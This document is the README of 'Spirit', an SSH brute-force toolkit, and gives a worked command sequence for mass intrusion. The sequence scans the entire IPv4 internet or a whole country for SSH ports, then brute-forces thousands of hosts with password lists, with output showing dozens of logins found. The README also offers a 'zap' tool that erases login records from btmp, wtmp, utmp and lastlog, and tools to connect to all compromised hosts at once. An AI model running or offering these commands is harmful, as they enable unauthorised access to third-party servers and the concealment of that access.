# Spirit - smart SSH brute toolkit
> Spirit tries 1 USER:PASS per HOST cycling through all the hosts and removing unreachable or filtered hosts. Each password attempt fewer hosts are being tried as the logic removes non-vulnerable hosts from the attack surface, this greatly increases the efficiency and speed of the brute-force attack.

We created this toolkit to speed up our offensive security pentesting tasks.
In Spirit you will find various tools beside the main SSH brute feature:
- brute (passfile)
- brute (privateKeys)
- banner (grabs SSH banners without performing a login)
- omni (connect to all your found.lst at once)
- omni (privateKey) (connect to all your found.lst at once using privateKey)

- masscan --country cn --ports 21,22,23 (masscan whole country using sane defaults)
- scan (basic TCP network scan [unprivileged]) (Beta) [`donate to improve`](#monero-xmr-thank-you)
- swarm (brute in distributed fashion [under development]) [`donate to speed things up`](#monero-xmr-thank-you)

- parse (parses masscan -oG output and creates h.lst in IP:PORT format)
- ports (generate random ports between 1 and 65535, excluding 22)
- abuse (checks your host against abuse databases)
- zap (removes connection logs from btmp/wtmp/utmp/lastlog/...)
- genpasswd (generates simple passwords from system users, useful for LAN pentesting)

And more... check out the helpfile [`$ ./spirit --help`](./HELP)

## Example usage
```bash
# make sure your masscan command uses -oG open.lst for the results output file
$ masscan --rate="50000" --ports "22,222,2222,2212" 0.0.0.0/0 --exclude 255.255.255.255 -oG open.lst
Scanning 4294967295 hosts [4 ports/host]

$ ./spirit parse open.lst
INFO created h.lst in HOST:PORT format

$ ./spirit banner
SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
INFO created b.lst in HOST:PORT:BANNER format

$ mv b.lst h.lst

$ ./spirit brute
INFO loaded h.lst with 26803 hosts
INFO loaded p.lst with 4881 logins
[2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
$ less -S found.lst

Tip: you can automate these steps with ./spirit auto
```

## Download the latest Spirit release
- wget https://github.com/aogspirit/spirit/raw/master/spirit.tgz
- curl -OL https://github.com/aogspirit/spirit/raw/master/spirit.tgz

## Binary self upgrade
```bash
./spirit upgrade

Upgrading 87% [========================>     ] (5.9/5.9 MB, 49.652 MB/s)
```
>*Spirit can self-upgrade only on amd64 aka x86-64 for now. [`donate to speed things up`](#monero-xmr-thank-you)

## Spirit Pro
You can buy a Pro license directly from the CLI `./spirit buy` and help support the the project
Licensing information can be found running `./spirit pro --info`

Most features are free to use, and you can reach back to us and ask for a trial Pro license.

# Support the Develpoment of the Spirit toolkit!
## Monero (XMR) thank you!
`8B81sxCMzoYc1cEu3EbHDfdCmtcooNtKp3sba9tGEpprM5PvADwXk76BFRRmuAUL2efvjm3Rp8uWHU5EULAPEbJGKoZ1x67`

## Bitcoin (BTC) thank you too!
`bc1q7plm79dgllrhrjz772x4vjrtvu9yy03738psy5`

## Support
If you have any issues with Spirit, feel free to contact us directly: \
on Telegram: https://t.me/aogspirit \
on IRC: #aog @ oftc.net \
or open a Github [issue](https://github.com/theaog/spirit/issues)
